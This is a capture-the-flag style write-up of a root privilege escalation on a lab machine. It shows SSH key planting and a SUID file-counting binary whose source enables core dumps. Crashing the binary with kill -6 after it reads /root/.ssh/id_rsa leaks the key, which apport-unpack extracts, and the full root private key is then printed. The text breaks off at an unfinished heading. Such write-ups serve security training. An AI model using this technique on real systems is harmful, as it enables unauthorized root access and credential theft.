# Privilege Escalation to root
## Making .ssh directory and copying kali public key to dasith user .ssh authorized_keys file
```bash
dasith@secret:~$ mkdir .ssh
mkdir .ssh
dasith@secret:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/mwm452HoYqTenuKZfoWk/GzXPOU7PHemPETWNWQw8mSBcy52PYGqqMYJ+L0Rj3F1xO/iVDw8w0kd6fcROiY6A2YpWAN/lqiUDlR/w3WREZj27Bp8G+FIm9fqNJqIV7y+gSpZUkgohqvb+z0iSWTT2k8bw9Ey7xKM35UMequdEUIyQpVG8/U75heBKkgk78k0inGBQ22ZBNcEsl0+CsCmtqJR3tkkcCLWaPnpsh5VWalwG3qMfU0b0fweTUC+yWr0PPad0mIc0qXsflSw6pD6WWDKnv0aLLToFMkTQymta5dV2kRbWQILlaWoNjuKd/btzek+VF53r/y1pZvkqlD/CJFtaWRtJ4ftVX1RFo8d1iSjMNEqpSt4hhhsJllLU2vivCBI+qpv6ziviLKBzUCSr+s5DAJ6Gcw7CUFy167utJHhx0AN1ePTq/szTNH2QdZ0qrZixx6KIBKWpoqaBSu9x5sw28J0ciEOuB8dU/YjGdk2cF+BxiJcCjAyaAztTVk= kali@kali' > /home/dasith/.ssh/authorized_keys
<TVk= kali@kali' > /home/dasith/.ssh/authorized_keys
dasith@secret:~$
```
Now we can do ssh login as `dasith` user
## Discovering `code.c` and `count` SUID binary in `/opt` directory
![[Pasted image 20211116224902.png]]
## Examinig `code.c` 
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```
![[Pasted image 20211116225045.png]]
Highlighted section of code enable coredump generation meaning coredump will be generated if program is crashed prematurely. As `count` is SUID binary so it allows users to execute the file with the permissions of its owner(which is root). So if `count` SUID binary is crashed , we can generate coredump which will contain contents of file read in memory like `/root/.ssh/id_rsa` (`count` SUID binary take file path as input from user run as root amd displays summary of characters,words,lines), so if we crash the `count` SUID binary after providing path of `/root/.ssh/id_rsa` , a core dump file will be generated in `/var/crash` directory containing contents of `/root/.ssh/id_rsa` in memory  and we can use `apport-unpack` tool to exract its contents and read content of `/root/.ssh/id_rsa`.
We can use two ssh terminal as dasith user , in first terminal we will run program and in second terminal we will use `ps aux` to know PID of count binary after program is run and then in first terminal we will provide path `/root/.ssh/id_rsa` and then in second terminal we will `kill -6 [PID]` to crash program and generate coredump file in `/var/crash` directory.
![[Pasted image 20211116232026.png]]
![[Pasted image 20211116232737.png]]
`CoreDump` contains contents of /root/.ssh/id_rsa
```bash
dasith@secret:~$ kill -6 1820
dasith@secret:~$ ls /var/crash/
_opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
dasith@secret:~$ ls -la /var/crash
total 92
drwxrwxrwt  2 root   root    4096 Nov 16 18:21 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 31404 Nov 16 18:21 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
dasith@secret:~$ ap
apparmor_parser       apport-bug            apport-unpack         apt                   apt-cdrom             apt-ftparchive        apt-mark
apparmor_status       apport-cli            appres                apt-add-repository    apt-config            apt-get               apt-sortpkgs
applygnupgdefaults    apport-collect        apropos               apt-cache             apt-extracttemplates  apt-key
dasith@secret:~$ apport-unpack _opt_count.1000.crash
Usage: /usr/bin/apport-unpack <report> <target directory>
dasith@secret:~$ apport-unpack _opt_count.1000.crash /tmp/
ERROR: Destination directory exists and is not empty.
dasith@secret:~$ apport-unpack _opt_count.1000.crash /tmp/dump
ERROR: [Errno 2] No such file or directory: '_opt_count.1000.crash'
dasith@secret:~$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/dump
dasith@secret:~$ cat /tmp/
dump/                                                                              systemd-private-1fd905e2cb8b41a1a11c9a57e2ff6c29-systemd-timesyncd.service-nKlchf/
.font-unix/                                                                        .Test-unix/
.ICE-unix/                                                                         vmware-root_722-2966037965/
snap.lxd/                                                                          .X11-unix/
systemd-private-1fd905e2cb8b41a1a11c9a57e2ff6c29-systemd-logind.service-AVClLi/    .XIM-unix/
systemd-private-1fd905e2cb8b41a1a11c9a57e2ff6c29-systemd-resolved.service-5VKcii/
dasith@secret:~$ cat /tmp/dump/
Architecture         Date                 ExecutablePath       _LogindSession       ProcCmdline          ProcEnviron          ProcStatus           Uname
CoreDump             DistroRelease        ExecutableTimestamp  ProblemType          ProcCwd              ProcMaps             Signal               UserGroups
dasith@secret:~$ cat /tmp/dump/CoreDump
ELF>@@8
=DM[0M[%M[PM[M[`fM[жM[۷M[`"M[M[M[`M[qM[M[²M[M[޶M[M[pĲM[
M[0M[KM["M[M[PMpEUSave results a file? [y/N]: l words      = 45
Total lines      = 39
/root/.ssh/id_rsa
$UUUUUUU,UuM[M[`M[-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----                                                             y+8       R
aELF>q@h@8@ED@@@I@IPPPuueevPPPP pppDDStdPPP Ptd^^QtdRtdv**GNUGNU        X>                                                                                                     ``M[M[`M[

 ohooJLinuxLinuxGNU˪bÓ@K(B/@l\,|4LzRx
Ec                                 nAT
GBA
  A
   [
BEA
  F
BHI\8H4ptAC
BA
 A
  R
BA
 A
BEsAC
DA
 A
  H
IA
 A
  @
   8%UHcIIHL7HAUATS7@uGttu[A\A]]fH H    I@(HHxD_H9s
H)IHЋOMX 9uHH=ɚ;v1H-ʚ;H=ɚ;wI[A\MA]]I1L%A$xL-LfA
2A9ufw1tHt%H1Hè`u                              $9uH H   ILcHA+fH H      HuH+ZIĉIHL
                 uú     =1UHATISHHt8HHUHM1H=u+HEHEHiMbH&H1MuH[A\]HL`H[A\]ËA$AT$HHtHUHAUIATAwt4HHH=mhA\1A]]DLA\A]]è`uHHH=!,HcH HHHuH1IuHI29t@[{Ht
Ht
   1WrO;sErf=;3r+;!111GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0.shstrtab.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_d.dynamic.note.eh                                                                                     ohhP
r%oJJ2ohhAJTPD^XhEn             [

0<
*f
dasith@secret:~$
```
![[Pasted image 20211116233257.png]]
## using 
  
